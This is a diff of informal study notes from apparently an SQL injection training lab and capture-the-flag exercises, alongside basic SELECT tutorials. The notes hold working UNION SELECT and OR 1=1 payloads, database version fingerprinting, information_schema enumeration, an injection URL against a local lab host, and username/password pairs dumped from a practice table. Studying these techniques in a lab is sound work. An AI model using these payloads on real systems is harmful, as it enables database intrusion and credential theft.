@@ -74,7 +74,7 @@ Audi ' UNION SELECT carid,name,color,cost,5 FROM sessin.car #         wont shoow
 ## use placeholders when there are more columns than values youre looking for 
 ### DEMO GET (search bar)
 ```
-http://10.50.29.140/uniondemo.php?Selection=1&Submit=Submit      replace submi-submit
+http://10.50.29.140/uniondemo.php?Selection=1&Submit=Submit      replace submit=submit
 # In the search bar replace & with:
 OR 1=1
 
@@ -89,7 +89,7 @@ OR 1=1
 
 ?Selection=3 UNION SELECT id,pass,name FROM session.user
 
-@@version - this gets the version of the database (put as a value like color or size n the left side of statement 
+' union select @@version #- this gets the version of the database (put as a value like color or size n the left side of statement 
 
 # Anbotate databases, tables, and columns
 Database: session
@@ -112,7 +112,7 @@ use information schema ;
   show columns ; 
   show columns from columns ; 
   select table_name,column_name from information_schema.columns ;
-  select table_schema,table_name,column_name from information_schema.columns ;
+ ## select table_schema,table_name,column_name from information_schema.columns ;
 
 show tables from session ;
 
@@ -127,7 +127,7 @@ select tireid,name,size from session.tires UNION SELECT name,type,cost from sess
 select tireid,name,size,4 from session.tires UNION SELECT name,type,cost,color from session.car ; color needs the 4 there to be added as 4 is the placeholder for it and pay attention to the number of columns 
 
 
-
+## union select rquires 2 columns thats where placeholders come in 
 
 
 
@@ -147,6 +147,7 @@ SELECT Title FROM Movies;
 SELECT Title,Director FROM Movies;
 SELECT Title,Year FROM Movies; 
 SELECT * FROM Movies; gets all information from mthe movies table 
+SELECT <column> FROM <table>
 
 SELECT id, title FROM movies    finds the movie with the id of 6
 WHERE id = 6;
@@ -166,20 +167,46 @@ WHERE Title LIKE "Toy Story%";
 SELECT * FROM movies                finds all movies by john lassester
 WHERE Director = "John Lasseter";
   ## LIKE "%word%" is used t find a string in a word 
-SELECT * FROM movies    finds all WALL-E movies
+SELECT * FROM movies              finds all WALL-E movies
 WHERE Title LIKE "WALL%";
 
 
+
 ## CTFs
+#1 ' UNION SELECT table_schema,table_name FROM information_schema.columns #
+column_name
+#2 
+' UNION SELECT table_schema,table_name FROM information_schema.columns #
+sqlinjection	categories
+sqlinjection	members
+sqlinjection	orderlines
+sqlinjection	orders
+sqlinjection	payments
+sqlinjection	permissions
+sqlinjection	products
+sqlinjection	share4
 
 
+#3
+http://127.0.0.1:11751/cases/productsCategory.php?category=1%20union%20select%20permission,username,password%20FROM%20sqlinjection.members
+after category 1 do union select permission,username,password FROM sqlinjection.members you need 3 fields because it uses 3 fields 
 
+Boss	BRJHlIX600KYqu6JHCpa	1.00
+Maverick	turn&burn	3.00
+phreak	pwd	4.00
+Susan	flowers99	3.00
+TW	imAPlaya	2.00
+1-2-3-4	sayULuvM3	2.00
+rich_kid	1M$	2.00
+p0pStar	thrilla	2.00
+Joe	vato
 
+#4
 
+#5 
+' union select @@version #
 
-
-
-
-
+#6
+switch sqlinjection to payments table 
 
 
